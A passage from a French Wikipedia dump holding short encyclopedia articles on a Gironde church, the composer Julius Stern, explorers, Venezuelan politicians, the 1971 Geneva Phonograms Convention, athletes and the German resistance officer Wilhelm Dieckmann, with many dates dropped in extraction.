Le rôle social de l’édifice religieux dans cette paroisse s’éclaire grâce à la présence de ce porche ayant servi de lieu de réunion et de marché, et de la litre funéraire, la grande bande noire, témoigne du deuil d'un des seigneurs du lieu au ou . Ainsi, l’église comme le château est un marqueur ostentatoire pour son seigneur. La prospérité du bourg a permis à l’église de se doter d’aménagements gothiques aux ou , ainsi que de nouvelles chapelles grâce au soutien du chapitre Saint-André de Bordeaux.
Un ensemble de peintures néo-gothiques vient décorer la chapelle nord, le chœur et la chapelle sud de l'église.
Saint-Pierre de Puisseguin est citée dans la liste de 1398 des paroisses du diocèse. Pendant la guerre de Cent Ans en 1453, le village fut en partie ruiné. Au , la paroisse est prospère et dépend d'un prieur. Mais les guerres de Religion de la fin de ce siècle amenèrent à la fortification générale de l'église. La nef a été exhaussée pendant les guerres de Religion. En 1587, les troupes de Turenne assiégèrent le village et son château.
En 1617, Saint-Pierre perdit son titre de paroisse, après le renvoi de son curé par le cardinal de Sourdis. Elle fut alors rattachée au chapitre de la cathédrale Saint-André de Bordeaux, qui l'érigea en vicariat perpétuel.
En 1664, une ordonnance est prise demandant de percer une petite porte dans le mur de l'église. D’après le procès-verbal établi en 1687 lors des visites de l’archiprêtré d’Entre-Dordogne par l’archevêque de Bordeaux, le chœur est voûté, ainsi que la nef.
En 1786, le vicaire est assez riche pour financer de grands travaux pour l'église. En 1858, le projet d’élever un clocher est émis par le Conseil de fabrique. Les plans ont été réalisés par l’architecte Léo Courreau. Des travaux de restauration du portail ont été entrepris de 1989 à 1991. La polychromie du portail a ainsi été mise en relief.
À l'extérieur de l'église, sur la façade sud se trouvent deux types de cadrans solaires. Le plus ancien est un cadran canonial gravé dans la pierre d'un des contreforts. Un cadran solaire plus moderne se trouve sur la façade occidentale.
Le portail est classé au titre des monuments historiques le .

</doc>
<doc id="9625412" url="https://fr.wikipedia.org/wiki?curid=9625412" title="Julius Stern">
Julius Stern

Julius Stern (Jesaja Isaak, né le à Breslau – à Berlin) est un professeur de musique, chef d'orchestre et compositeur prussien.
Biographie.
Julius Stern est né à Breslau dans une famille juive. Il a été initié à la musique par le violoniste Peter Lüstner, et à l'âge de neuf ans, il jouait dans des concerts. En 1832, ses parents l'ont conduit avec sa sœur à Berlin, où Stern a étudié d'abord avec Maurer, Ganz et de Saint-Lubin, et plus tard avec Rungenhagen à la Künste Königliche Akademie. À la suite de plusieurs œuvres qu'il avait écrites, en tant qu'élève de l'académie, le roi Frédéric-Guillaume IV de Prusse, qui était un amoureux passionné des arts, a accordé une bourse à Stern pour lui permettre de poursuivre ses études. Stern est allé à Dresde, où il a reçu les leçons de Miksch; et de là à Paris où il est arrivé en . Là Stern a pris la suite de Conradin Kreutzer à la tête du "deutschen Gesangverein". Il a fait la connaissance de Giacomo Meyerbeer et d'Hector Berlioz. Chez le banquier Auguste Léo, il a rencontré Frédéric Chopin. Il a dirigé, entre autres ouvrages, la musique de scène d' de Mendelssohn d'après Sophocle.
En 1844, Stern est retourné à Berlin, où, il chantait au sein de l'Académie de chant de Berlin. En 1847, il a fondé le "Stern Gesangverein". La première représentation de l'oratorio "Elias" de Mendelssohn () a établi la réputation de Stern comme l'un des chefs les plus importants de son époque, et son chœur a constamment augmenté en taille et en qualité, de sorte que le répertoire de la société a abordé non seulement les œuvres classiques de Haendel , Haydn et Bach, mais aussi celles des compositeurs contemporains. En 1872, le Gesangverein a célébré son vingt-cinquième anniversaire au milieu d'un grand enthousiasme. Deux ans plus tard, Stern a été contraint de démissionner de son mandat d'administrateur en raison de sa mauvaise santé.
Encore plus importante pour le développement de la musique a été la "Musikschule für Gesang, Klavier und Komposition" ("École de musique pour le chant, le piano et la composition"), fondée conjointement en 1850 par Stern, Theodor Kullak et Adolf Bernhard Marx. Après la démission de Kullak en 1855, et de Marx en 1857, Stern est devenu propriétaire unique de l'institution qui a pris le nom de Conservatoire Stern (Stern’sche Konservatorium) et qu'il a dirigée jusqu'à sa mort. De 1869 à 1871, il a été le chef d'orchestre de l'Orchestre Symphonique de Berlin, et de 1873 à 1874 il a conduit les concerts dans le Reichshalle, où il a trouvé l'occasion de réaliser son idée favorite qui était de présenter les œuvres des jeunes musiciens de talent devant le public. En 1849, il a reçu le titre de « Directeur Royal de la Musique », et en 1860 celui de « professeur ».
Stern est mort à Berlin en 1883, âgé de 62 ans.
Œuvres.
Stern a écrit "Barcarolle" pour voix, violoncelle et piano, "les Adieux" pour violon et piano, des chœurs d'hommes, des lieder, un opéra "Ismene" qui n'a jamais été représenté.
Il a aussi écrit des exercices de chant qui ont été longtemps utilisés.
Dans ses jeunes années, Stern a composé une série de lieder, qui en leur temps ont obtenu un certain succès.
Honneurs.
L'Université des arts de Berlin a baptisé un Institut d'après le nom du compositeur: "Julius-Stern-Institut für musikalische Nachwuchsförderung".
Le Sénat de Berlin et le bureau de district de l'Arrondissement de Mitte ont honoré le , l'œuvre du musicien en mettant une plaque commémorative sur son dernier domicile, Friedrichstrasse 214.

</doc>
<doc id="9625414" url="https://fr.wikipedia.org/wiki?curid=9625414" title="Georges Charles Émile Colin">
Georges Charles Émile Colin

Georges Charles Émile Colin, né Émile Charles Stephen Georges Colin le aux Essarts (Vendée) et mort le à Marseille, est un médecin et explorateur français de l'Afrique de l'Ouest.
Biographie.
Médecin dans la Marine nationale, il participe aux campagnes topographiques de Gustave Borgnis-Desbordes au Sénégal (1881-1882). Il soutient en 1883 devant la faculté de Paris une thèse de médecine intitulée "Contribution à la géographie médicale du Haut-Sénégal".
Le ministère de la Marine le charge en 1883 de visiter les districts aurifères du Bambouk et du Bouré occupés par des partisans de Samory. Il part alors de Bakel le avec dix mille francs de marchandises de traite et passe à Sénoudébou où on lui remet des lettres de recommandation pour les chefs du Bambouk.
Il franchit la Falémé, arrive à Kéniéba en septembre puis atteint la première mine d'or du Bambouk à Sola (octobre). Dans le Tambaoura le mois suivant, il signe un traité de commerce avec le roi. Il marche alors sur le Bafing et entre à Kassama qu'il est le premier Européen à découvrir. Il rejoint ensuite Bafoulabé et, sur le trajet retour, visite les mines d'or du Diébédougou. Il rentre enfin à Bakel le .
Le , il s'embarque à Bordeaux et semble avoir séjourné assez longuement sur l'île de Carabane. On perd sa trace ensuite.

</doc>
<doc id="9625419" url="https://fr.wikipedia.org/wiki?curid=9625419" title="20 septembre 1973">
20 septembre 1973

Autres événements.
Vins italiens.
Ces vins italiens ont obtenu leur appellation

</doc>
<doc id="9625446" url="https://fr.wikipedia.org/wiki?curid=9625446" title="Kaņieris">
Kaņieris

Le Kaņieris (en letton : Kaņiera ezers) est un lac de la province du Zemgale en Lettonie. Il est situé sur le territoire administratif de Lapmežciema pagasts dans Engures novads. Sa superficie s'étend sur .
Milieu naturel.
Le site du lac représente une zone humide, avec les rives basses, couvertes en grande partie par la végétation hélophyte. Le fond est constitué de particules sédimentaires fines de limons et d'argiles couvrant le lit de dolomite. On y dénombre soixante-trois espèces de poissons. 
Hydrologie.
C'est un lac naturel qui par le bras de Slocene est relié à la Lielupe. Le canal artificiel Starpiņupīte est créé au début du pour permettre l'écoulement de ses eaux vers le golfe de Riga. À cette époque le niveau de Kaņieris se situe à 2-2,3 m au-dessus du niveau de la mer, il baisse alors progressivement jusqu'à attendre 1,3 m en 1945-1965, la zone aux alentours se transforme alors en marécage. En 1965, on construit une écluse sur la Starpiņupīte.

</doc>
<doc id="9625447" url="https://fr.wikipedia.org/wiki?curid=9625447" title="Secrétaire financier au ministère de la Guerre">
Secrétaire financier au ministère de la Guerre

Le secrétaire financier au ministère de la Guerre est un poste du gouvernement du Royaume-Uni qui se chargeait des finances pour le ministère de la Guerre.
Le poste a été combiné avec le Sous-secrétaire d'État à la guerre le .

</doc>
<doc id="9625493" url="https://fr.wikipedia.org/wiki?curid=9625493" title="Raymond Colrat de Montrozier">
Raymond Colrat de Montrozier

Jean Marcel Raymond Colrat de Montrozier (Sarrazac, - Paris, ) est un journaliste et explorateur français.
Famille.
La famille Colrat de Montrozier, d'ancienne bourgeoisie de Haute-Auvergne, résidait à Chaudes-Aigues. Elle avait acquis le château de Montrozier à la fin du . Maurice Colrat (1871-1954), directeur du journal "L'Opinion", était ministre sous la Troisième République. 
Elle fait partie des familles subsistantes d'ancienne bourgeoisie française.
Biographie.
Raymond Colrat de Montrozier participe en 1898-1899 à la mission commerciale de Bonnel de Mézières, dont son livre, "Deux ans chez les anthropophages", est en partie le journal de la mission. Les autres collaborateurs de la mission sont Charles Pierre, Georges Bourgeault et Louis Martel. Colrat de Montrozier arrive à Bangui le , par la "Henriette", vapeur hollandais venant de Brazzaville. Il est reçu par le docteur Briand qui le soigne et avec lequel il chasse. . écrit le docteur. Il remonte alors le Congo puis l'Oubangui et visite les sultanats du Mbomou : Bangassou, Rafaï et Zémio. 
Seul, il explore la vallée de la Chinko puis le Bahr el Ghazal et le pays Djour de Tamboura à Fort-Desaix. Il démontre que la grande richesse de ces contrées est le caoutchouc, le musc et l'indigo. Son voyage débouche sur la fondation de la Compagnie commerciale des Sultanats.
En 1903, il effectue encore un périple en Asie centrale puis Codirecteur du "Courrier de Tunisie" (1908) et Directeur de "La Semaine" (1909), travaille comme correspondant de guerre en 1911 en Tripolitaine.

</doc>
<doc id="9625506" url="https://fr.wikipedia.org/wiki?curid=9625506" title="Cilia Flores">
Cilia Flores

Cilia Flores, née le à Tinaquillo au Venezuela, est une avocate et femme d'État vénézuélienne. Membre du Parti socialiste unifié du Venezuela (PSUV), elle est présidente de l'Assemblée nationale entre 2006 et 2011 et, épouse du président Nicolás Maduro, Première dame du Venezuela depuis 2013.
Biographie.
C'est une avocate, qui fait partie des défenseurs d'Hugo Chávez quand ce dernier se retrouve en prison après le coup d’État manqué de 1992. Durant la présidence d'Hugo Chávez, de février 1999 à mars 2013, elle est députée, présidente du Parlement de 2006 à 2011, et procureure. Elle fait l'objet de critiques pour népotisme après avoir fait embaucher 37 personnes de sa famille au sein de l’Assemblée nationale.
En juillet 2013, elle se marie avec Nicolás Maduro, avec qui elle était en couple depuis les années 1990, qui a accédé à la présidence de l’État en mars, à la suite de la mort d'Hugo Chávez. Le 30 juillet 2017, elle est élue membre de l'Assemblée nationale constituante mise en place par son mari pour élaborer une nouvelle constitution, une élection à laquelle l'opposition ne participe pas.
Le , elle fait l'objet de sanctions économiques américaines.
Vie privée.
Avec son époux, elle est une adepte du gourou indien Sathya Sai Baba.

</doc>
<doc id="9625512" url="https://fr.wikipedia.org/wiki?curid=9625512" title="Long Way to Heaven">
Long Way to Heaven

 est le cinquième album du groupe de metal canadien Helix, sorti en 1985.
Liste des pistes.
Face 1:
Face 2:

</doc>
<doc id="9625519" url="https://fr.wikipedia.org/wiki?curid=9625519" title="Obira">
Obira

 est un bourg du district de Rumoi, situé dans la sous-préfecture de Rumoi, sur l'île de Hokkaidō, au Japon.
Géographie.
Démographie.
Au , la population d'Obira s'élevait à répartis sur une superficie de .

</doc>
<doc id="9625528" url="https://fr.wikipedia.org/wiki?curid=9625528" title="Sport Club Dilettanti Marsala 1912">
Sport Club Dilettanti Marsala 1912

Le Sport Club Dilettanti Marsala 1912 est un club de football italien basé à Marsala, en Sicile. Le club évolue pour la saison 2015-2016 en Serie D. Fondé en 1912, le club est dissout en 2000 avant d’être refondé en 2006.
Histoire.
Le club de Marsala est fondé en 1912. Elle se nomme d'abord "Lilybeum", qui est le nom de la ville à l'époque romaine. Après la Première Guerre Mondiale, il participe à la Coppa Federale Siciliana aux côtés de clubs tels que Palerme ou Messina. Le club perd en demi finale contre Palerme, le futur vainqueur. Néanmoins, le club reste longtemps au niveau amateur. 
C'est à partir de 1942 que Marsala devient professionnel, à la suite de sa sixième place en Serie C. Au total, le club à participer 28 fois à la compétition. En 1960, le SC Marsala manque de peu la montée en Serie B. L'équipe sicilienne a contribué au lancement de plusieurs joueurs prometteurs tel que Marco Materazzi ou Patrice Évra.
En 2000, après une relégation en Serie D, Marsala fait faillite et fait face à la dissolution. Peu après, une nouvelle équipe du nom de "Associazione Sportiva Marsala 2000" voit le jour et sera promu en Serie D. De nouveaux problèmes financiers et une relégation signe la fin de l'équipe en 2004.
En 2006, le club de Marsala revoit le jour grâce à un groupe d’entrepreneurs et se retrouve en seconde catégorie du championnat de Sicile. La ville compte également d'autres équipes durant cette période étant l"'USD Petrosino Marsala" et le "SC Marsala ASD". L'année suivante, le SC Marsala, après une tentative ratée avec le "SC Marsala ASD", se fusionne avec l'US "Kennedy Birgi 1967" et participe à la Promozione, championnat régional. Durant la saison 2008-2009, Marsala est promu en Eccellenza, cinquième division italienne, à la suite de sa victoire dans les plays off. Le club retrouve la serie D après son sacre en Eccellenza en 2010.
Couleurs et symboles du club.
Les couleurs officielles de Marsala tout au long de son histoire sont le bleu et le blanc. En 2009, l'hymne officiel du club est rédigé par le chanteur-compositeur-interprète Mark Messineo Marsala. Elle se nomme ().

</doc>
<doc id="9625529" url="https://fr.wikipedia.org/wiki?curid=9625529" title="Kristaps Bahmanis">
Kristaps Bahmanis

Kristaps Bahmanis ou Bachmanis, né le à Nīkrāce dans le gouvernement de Courlande et mort le à Riga, est juriste, écrivain, journaliste et homme politique letton, plusieurs fois député à la chambre (Saeima). Commandeur de l'ordre des Trois Étoiles
Biographie.
Né dans le canton de Nīkrāce dans la ferme de "Stirpaiķi". Acteur de la Révolution de 1905, comme Rainis, il prend en 1907 le chemin de l'exil vers la Suisse.
À partir de 1914, il travaille comme notaire dans la petite ville de Bauska. Durant la Première Guerre mondiale, il est un des organisateurs du Comité central d'approvisionnement des réfugiés lettons (1915-1918) qui ont dû fuir massivement (environ personnes) la Courlande envahie par les armées allemandes, et qui se dispersent sur l'ensemble du territoire de l'Empire russe. En 1917, il siège au sein du Conseil territorial provisoire de Courlande ("Kurzemes Zemes padome") en qualité de secrétaire Conseil national provisoire de Lettonie ("Latviešu Pagaidu Nacionālā padome"). De 1918 à 1920, en tant que membre du comité exécutif du Comité central des Lettons d'Ukraine, et de représentant de la Lettonie en Russie méridionale, en Ukraine, en Crimée, sur le Don, en Géorgie et en Arménie, il gère le rapatriement des réfugiés en Lettonie. 
Élu député au sein de la première et de la deuxième assemblée ("1. un 2. Saeima"), il représente le petit parti centriste de l'Union des Nouveaux paysans ("Jaunzemnieku savienība"). Après son échec électoral lors de la troisième législature, il rejoint l'Union progressiste ("Progresīvā apvienība") aux côtés de laquelle il siège au sein de la quatrième assemblée ("4. Saeima"). 
Homme de lettres prolixe, collaborateur de nombreux journaux, il est l'auteur de d'ouvrages extrêmement bien documentés, et décrit avec un authentique talent de conteur son expérience de la Révolution de 1905 ainsi que son action auprès des réfugiés lettons en Russie et en Ukraine.
Il meurt le dans son appartement de Riga. Il repose au cimetière de la Forêt à Riga (Rīgas Meža kapi).

</doc>
<doc id="9625531" url="https://fr.wikipedia.org/wiki?curid=9625531" title="Maîtrise de la Cathédrale du Puy-en-Velay">
Maîtrise de la Cathédrale du Puy-en-Velay

La Maîtrise de la Cathédrale du Puy-en-Velay est une chorale d'enfants rattachée à la cathédrale du Puy. En succédant à une longue tradition dans cette ville, celle-ci fut créée en 1999 sous l'épiscopat d'Henri Brincard.
Les sites officiels emploient essentiellement "Maîtrise de la Cathédrale du Puy-en-Velay".
Histoire.
Maîtrise au Moyen Âge.
Il est possible que la cathédrale du Puy possédât son chœur sous le regne de Charlemagne. Ce dernier ordonna en 789 par son "Admonitio generalis" que le chant liturgique selon le rite romain, à savoir chant vieux-romain puis chant grégorien, soit obligatoire dans tout son royaume.
À la suite d'une découverte en 1885 par le prêtre Jean-Baptiste Payrard, la liturgie ancienne et propre auprès de la cathédrale du Puy fut effectivement établie. La pratique remonte vers 1100 tandis que la cathédrale conservait certainement ses propres livres de chant aux et siècles. Le diocèse suggère encore qu'il existe quelques partitions datées du et du siècles. Dans la célébration en France, la voix la plus aiguë était toujours assurée par le chœur d'enfants et non celle des chanteuses, jusqu'à ce que le roi Louis XIV invite des femmes à la chapelle royale. Donc, ces livres de chant à plusieurs voix indiquent l'existence de la maîtrise à la chapelle du Puy. 
Il reste cependant une grosse difficulté pour connaître l'origine de la maîtrise du Puy. Les archives de la cathédrale subirent deux fois d'incendie, au puis sous l'épiscopat de Jean de Bourbon († 1485), à cause desquels de nombreux documents furent perdus.
Manécanterie Notre-Dame.
La Révolution française rompit brutalement cette tradition de la maîtrise et, jusqu'au début du , le chœur ne fut pas rétabli.
Le , Norbert-Georges-Pierre Rousseau fut nommé évêque du Puy. Ce théologien et professeur du séminaire du Mans était non seulement un spécialiste du chant grégorien mais aussi lié à la cathédrale Saint-Julien du Mans, qui conservait de même une longue tradition des maîtrises depuis le Moyen Âge. Il est normal qu'à la suite de son arrivée au Puy, le nouvel évêque ait restauré la maîtrise, déjà en 1926. Étroitement lié au Vatican, l'évêque répartissait l'idée de la constitution apostolique "Divini cultus sanctitatem", article VI (1928), qui favorisait la création des schola des enfants aux diocèses. 
Puis, cette "Manécanterie Notre-Dame" fut remplacée, en 1960, par les "Petits-Chanteurs du Mont-Anis.
Maîtrise de la Cathédrale.
En , lors de la clôture du jubilé du Puy, la maîtrise participa à l'exéction des "Vespro della Beata Vergine" de Claudio Monteverdi. Cet événement fut réalisé en collaboration avec le Festival de musique de la Chaise-Dieu.

</doc>
<doc id="9625533" url="https://fr.wikipedia.org/wiki?curid=9625533" title="District de Rumoi">
District de Rumoi

Le est un district de la sous-préfecture de Rumoi au Japon.
Au , sa population était estimée à habitants pour une superficie de .

</doc>
<doc id="9625538" url="https://fr.wikipedia.org/wiki?curid=9625538" title="Jean Bertius">
Jean Bertius

Jean Bertius (en religion Césaire de Saint-Bonaventure), né à Leyde en 1615 et décédé le à Malte, est un prêtre carme déchaux français, d'origine hollandaise, fondateur de la mission de son Ordre dans les Provinces-Unies.
Biographie.
En famille.
Jean Bertius est né à Leyde en 1615, de Pierre Bertius et Marie-Anne Keuschelin. En 1620, à la suite de démêlés avec les théologiens calvinistes, son père s'est exilé en France et est devenu géographe de Louis XIII: il revient au catholicisme. Des six enfants de la famille, trois entreront chez les carmes déchaux. Jean réalisera la fondation de la mission hollandaise, et Abraham, devenu Pierre de la Mère de Dieu, y organisera des conférences religieuses. Quant au troisième, Paul de Jésus-Marie, il se destinera à la mission d'Alep et mourra à Tripoli le .
En formation.
Admis au noviciat de Charenton, Jean fait profession le , sous le nom de "Césaire de Saint-Bonaventure". Au terme d'une dizaine d'années de formation dans différents couvents parisiens, il s'ouvre à ses supérieurs de son désir de rentrer dans son pays d'origine pour œuvrer à la conversion des Hollandais. Le prieur provincial, Bernard de Saint Joseph, lui permet alors de se rendre à Rome, pour y plaider sa cause auprès du préposé général, Paul-Simon Rivarola. Cependant, la mort de celui-ci en 1644, puis un différend entre la province française et la province flandro-belge quant à la juridiction sur la future mission de Hollande, vont obliger Césaire à différer la réalisation de son projet, jusqu'en 1647, année où le chapitre général décide de soumettre la nouvelle mission au définitoire général et d'y envoyer des religieux provenant des deux provinces, les Belges ayant l'avantage de parler le néerlandais, et les Français celui de ne pas être officiellement engagés dans la lutte entre les Pays-Bas espagnols et les Provinces-Unies.
En Hollande.
En 1647, Césaire se rend à Bois-le-Duc, accompagné de son frère, Pierre de la Mère-de-Dieu, afin de s'initier aux conditions de son futur apostolat. Il y rencontre des Dominicains, des Franciscains et des Jésuites, qui lui expliquent comment s'effectue leur ministère clandestin. Le doyen de la cathédrale, en l'absence de l'évêque, lui donne l'autorisation de confesser et de prêcher. Au terme d'une retraite à l'ermitage de la Marlagne, établi par les déchaux non loin de Namur, Césaire, habillé en civil, franchit la frontière hollandaise, enfreignant la loi qui interdisait alors aux prêtres et religieux catholiques de s'introduire aux Pays-Bas. Entré par Nimègue, il se rend successivement à Arnhem, Utrecht, Amsterdam, Haarlem et Leyde, avant de rencontrer à La Haye l'ambassadeur de France, lequel lui promet la protection de Louis XIV. Dix ans durant, Césaire travaillera dans la clandestinité à regagner au catholicisme ceux que l'Église catholique considérait comme des hérétiques ou des apostats.
En France et à Malte.
L'aventure hollandaise se terminera toutefois aux environs de 1657, à la suite des intrigues menées par la marquise de Francoso, femme de l'ambassadeur du Portugal, qui, après avoir hébergé Césaire et s'être mise sous sa direction spirituelle, n'a pas supporté d'entendre celui-ci réclamer sa liberté. Elle sollicite alors l'ambassadeur d'Espagne, le nonce apostolique et le coadjuteur, archevêque d' ipi, tant et si bien que l'ambassadeur de France conseille au carme de quitter le pays, s'il ne veut pas devenir la cause involontaire d'une véritable affaire d’État. C'est désormais "Pierre de la Mère de Dieu" qui remplacera son frère aux postes de Leyde, La Haye et Amsterdam. Revenu en France, Césaire demeurera trois ans à Amiens, en qualité de prieur. Il sera ensuite nommé directeur du séminaire des missions à Malte, où il meurt le , brisé par la vie de privations menée dans les Provinces-Unies.
Postérité.
A Malte les Hospitaliers de l'ordre de Saint-Jean de Jérusalem des langues de France, d'Auvergne et de Provence sont profondément édifiés par son zèle apostolique et la sainteté de ses mœurs. Ils assisteront aux obsèques du père Césaire, et commanderont même son portrait, actuellement conservé au couvent de Cospicua. Quelques années plus tard, le carme déchaux Louis de Sainte-Thérèse, visiteur de l'Ordre, racontera sa vie et lui rendra hommage dans son "Histoire de la mission des carmes déchaussés en Hollande". Outre Pierre de la Mère-de-Dieu, Vincent de Saint-Louis Stalpaert et Pierre de-la-Croix (Van Valkenissen) continueront son œuvre en terre hollandaise. Les carmes déchaux y continueront la mission catholique jusqu'à la Révolution française, à l'issue de laquelle seul le poste de Leiderdorp aura survécu. 
Il convient de souligner également que, durant son séjour dans les Provinces-Unies, Césaire a publié des ouvrages de piété et de controverse, comme ce "Traité du Saint-Sacrement de l'Eucharistie", dans lequel il expose, en se basant sur l'Écriture sainte, les théories de la transsubstantiation, de la présence réelle et de la défense faite aux fidèles de communier sous les deux espèces. Ce sujet a été choisi en réponse aux objections calvinistes, mais la piété eucharistique a aussi fait l'objet d'un ouvrage de Pierre de la Mère-de-Dieu, sur base d'une œuvre d'Alexandre Roger, l'un des résidents, au , du Désert de Marlagne.

</doc>
<doc id="9625544" url="https://fr.wikipedia.org/wiki?curid=9625544" title="Carmen Meléndez">
Carmen Meléndez

Carmen Meléndez, de son nom complet Carmen Melendez Teresa Rivas, née le à Barinas (Venezuela) est une femme politique vénézuélienne. Membre du Parti socialiste unifié du Venezuela (PSUV), elle est ministre de l'Intérieur et de la Justice entre 2014 et 2015 et ministre des Relations intérieures, de la Justice et de la Paix entre 2020 et août 2021. Elle est élue mairesse de Caracas aux élections régionales du 21 novembre 2021.
Biographie.
Carrière politique.
Début août 2021, elle est désignée candidate du Parti socialiste unifié du Venezuela à la mairie de la capitale Caracas aux élections de novembre 2021, qu'elle remporte.

</doc>
<doc id="9625552" url="https://fr.wikipedia.org/wiki?curid=9625552" title="Convention des phonogrammes de Genève">
Convention des phonogrammes de Genève

La convention pour la protection des producteurs de phonogrammes contre la reproduction non autorisée de leurs phonogrammes ou plus communément Convention de Genève sur les phonogrammes est un accord international relatif à la protection des enregistrements sonores signé en 1971.
Contexte légal.
Au milieu des années 1950, la Convention de Berne pour la protection des œuvres littéraires et artistiques, la et la ont accordé de solides droits aux créateurs de contenu artistique, tout comme aux interprètes et compositeurs de musique, et ce dans la plupart des pays du monde. Ainsi, l'éditeur d'un livre peut poursuivre tout personne qui en publie des copies non autorisées, même si l'un et l'autre se trouvent dans des pays différents. Mais il n'existait aucune protection équivalente pour les enregistrements sonores.
La Convention de Rome de 1961 accorda pour la première fois une reconnaissance de copyright pour les enregistrements sonores. À partir de là, les labels discographiques disposaient d'une reconnaissance de copyright sur les enregistrements eux-mêmes, séparément du compositeur et de l'interprète. Cela leur donna alors le droit de poursuivre toute personne réalisant des copies non autorisées de leurs enregistrements dans les pays étrangers.
Contexte technologique.
Au milieu des années 1960, les labels discographiques commencèrent à produire des cassettes audio préenregistrées, une technologie apparue à la fin des années 1950 qui offrait la possibilité de lecteurs plus petits et un stockage plus facile comparé aux disques vinyles. Mais il était aussi moins coûteux et plus simple de réaliser des copies illégales par rapport aux disques vinyles. Vers la fin des années 1960, les violations de copyright et la contrefaçon des enregistrements était devenue courante, et l'industrie musicale fit alors pression pour obtenir un nouveau traité international lui accordant des droits supplémentaires pour combattre ces infractions.
Contenu de la convention.
La convention impose aux États contractants à:
Condition spécifique pour l'obtention de la protection.
Contrairement à la convention de Berne, qui n'imposait aucune condition en vue d'obtenir une protection, la convention de Genève en impose une. Pour obtenir la protection offerte par cette convention, les copies de l'enregistrement devront porter une mention de copyright spécifique aux enregistrements sonores. La mention est constituée par le symbole de copyright phonographique "℗" (une lettre majuscule P dans un cercle), l'année de publication, et le nom du détenteur du copyright.

</doc>
<doc id="9625559" url="https://fr.wikipedia.org/wiki?curid=9625559" title="Lucas Pratto">
Lucas Pratto

Lucas Pratto est un footballeur international argentin né le à La Plata (Argentine) évoluant au poste d'avant-centre au Club Olimpia.
Carrière.
Lucas Pratto rejoint Boca Juniors en 2005. Il est ensuite prêté de 2007 à 2011, jouant successivement pour le Club Atlético Tigre, le FK Lyn, le Club Atlético Unión et le Club Deportivo Universidad Católica. Il rejoint en 2011 le Genoa puis est prêté en 2012 au Club Atlético Vélez Sarsfield pour lequel il joue jusqu'en 2014.
Le , il signe un contrat de quatre ans avec l'Atlético Mineiro. Il marque 13 buts lors du championnat du Brésil 2015.
Le , il signe un contrat de quatre ans avec le São Paulo FC .

</doc>
<doc id="9625565" url="https://fr.wikipedia.org/wiki?curid=9625565" title="Tamara Tippler">
Tamara Tippler

Tamara Tippler, née le à Rottenmann, est une skieuse alpine autrichienne. Elle est spécialiste des épreuves de vitesse (descente et super G).
Carrière.
La carrière internationale de Tamara Tippler démarre en 2006.
Elle participe à sa première course de Coupe du monde de ski alpin le à l'occasion d'un super G organisé à Lake Louise. Elle marque ses premiers points en 2013 en terminant du super combiné de Méribel.
Le , elle accède pour la première fois à un podium de coupe du monde en terminant deuxième de la descente de Lake Louise. Plus tard dans l'hiver, elle monte sur deux podiums en super G à Soldeu et Lenzerheide, la plaçant septième au classement de la spécialité.
Elle renoue avec le podium trois ans plus tard en prenant la troisième place du super G de Cortina d'Ampezzo.
Elle compte une participation aux Jeux olympiques en 2018, où elle est en super G et deux aux Championnats du monde, dont son meilleur résultat est une neuvième place en descente lors de l'édition 2019.
Liens externes.
 

</doc>
<doc id="9625567" url="https://fr.wikipedia.org/wiki?curid=9625567" title="Andreas Rasmussen">
Andreas Rasmussen

Andreas Rasmussen, né le à Aalborg et mort le dans la même ville, est un joueur de hockey sur gazon danois. 
Il est médaillé d'argent aux Jeux olympiques d'été de 1920 à Anvers avec l'équipe du Danemark de hockey sur gazon ; il joue trois matchs durant cette compétition.

</doc>
<doc id="9625580" url="https://fr.wikipedia.org/wiki?curid=9625580" title="Rock 'n' Roll Telephone">
Rock 'n' Roll Telephone

Rock 'n' Roll Telephone est le studio du groupe écossais Nazareth, sorti le .
Dernier album avec le chanteur emblématique et légendaire Dan McCafferty, diagnostiqué d'une broncho-pneumopathie chronique obstructive, doit quitter le groupe.
Rock 'n' Roll Telephone.
Toutes les chansons sont écrites par le groupe.

</doc>
<doc id="9625582" url="https://fr.wikipedia.org/wiki?curid=9625582" title="Groupe de Phocée">
Groupe de Phocée



</doc>
<doc id="9625584" url="https://fr.wikipedia.org/wiki?curid=9625584" title="Wilhelm Dieckmann">
Wilhelm Dieckmann

Wilhelm Dieckmann (né le à Stotel, mort le à Berlin) est un officier allemand, résistant contre le nazisme.
Biographie.
Wilhelm Dieckmann est le fils de Wilhelm Dieckmann, surintendant, et de son épouse. Après l'abitur, il étudie la théologie, la philosophie et l'histoire à Leipzig, Berlin et Göttingen. Il participe à la Première Guerre mondiale avec le grade de lieutenant. Il reprend ses études en 1920 à 1922 à Berlin et s'intéresse au droit, à l'économie et à l'histoire. Après son doctorat en 1923, il devient archiviste dans le département d'économie aux Archives du Reich à Potsdam puis dans celui de la guerre et de l'histoire militaire. Il est aussi réserviste dans le d'infanterie et est nommé Oberleutnant en 1935. En 1939, il devient commandant du d'infanterie.
Par son travail, il fait la connaissance d'Erika , la fille du président du Reichsarchiv Hermann Mertz von Quirnheim, qu'il épouse. Par ce mariage, il devient le beau-frère d' qui a épouse une sœur de sa femme.
Après l'arrivée des nazis au pouvoir, Dieckmann pose une distance avec le nouveau régime. Il rejoint l'Église confessante et entre dans la résistance en 1935. Grâce à son beau-frère Albrecht Mertz von Quirnheim, il est en contact avec les officiers préparant le complot du 20 juillet 1944. Peu après, il est arrêté par la Gestapo. Après avoir subi la torture, il est abattu par la Gestapo dans la prison de Lehrter Straße.

</doc>
<doc id="9625585" url="https://fr.wikipedia.org/wiki?curid=9625585" title="Équipe du Danemark de hockey sur gazon">
Équipe du Danemark de hockey sur gazon

L'équipe du Danemark de hockey sur gazon est la sélection des meilleurs joueurs danois de hockey sur gazon.

</doc>
<doc id="9625592" url="https://fr.wikipedia.org/wiki?curid=9625592" title="Urmas Rooba">
Urmas Rooba

Urmas Rooba, né le à en Estonie, est un footballeur international estonien, qui évoluait au poste de défenseur. Il est le jeune frère de Meelis Rooba.
Biographie.
Carrière de joueur.
Urmas Rooba dispute 4 matchs en Ligue des champions, 11 matchs en Ligue Europa, et 4 matchs en Coupe Intertoto.
Carrière internationale.
Urmas Rooba compte 70 sélections et 1 but avec l'équipe d'Estonie entre 1996 et 2008. 
Il est convoqué pour la première fois par le sélectionneur national Teitur Thórdarson pour un match de la Coupe baltique 1996 contre la Lettonie le , où il marque son premier but en sélection durant cette rencontre (1-1). Il reçoit sa dernière sélection le contre les îles Féroé (victoire 4-3).

</doc>
<doc id="9625594" url="https://fr.wikipedia.org/wiki?curid=9625594" title="Poney d'Arenberg">
Poney d'Arenberg



</doc>
<doc id="9625597" url="https://fr.wikipedia.org/wiki?curid=9625597" title="Souk El Blaghgia">
